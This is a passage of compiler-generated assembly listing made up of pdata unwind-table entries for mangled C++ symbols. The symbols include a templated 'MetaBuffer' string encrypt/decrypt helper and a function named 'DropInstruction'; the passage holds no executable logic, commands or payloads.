$pdata$?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+1256
	DD	imagerel $unwind$??0?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+500
	DD	imagerel $unwind$??0?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DD imagerel $LN5
	DD	imagerel $LN5+711
	DD	imagerel $unwind$?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+1004
	DD	imagerel $unwind$??0?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+4868
	DD	imagerel $unwind$??0?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+248
	DD	imagerel $unwind$??0?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+332
	DD	imagerel $unwind$??0?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@@Z DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Pocca@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@AEBV10@@Z DD imagerel $LN3
	DD	imagerel $LN3+46
	DD	imagerel $unwind$??$_Pocca@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@AEBV10@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+72
	DD	imagerel $unwind$??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
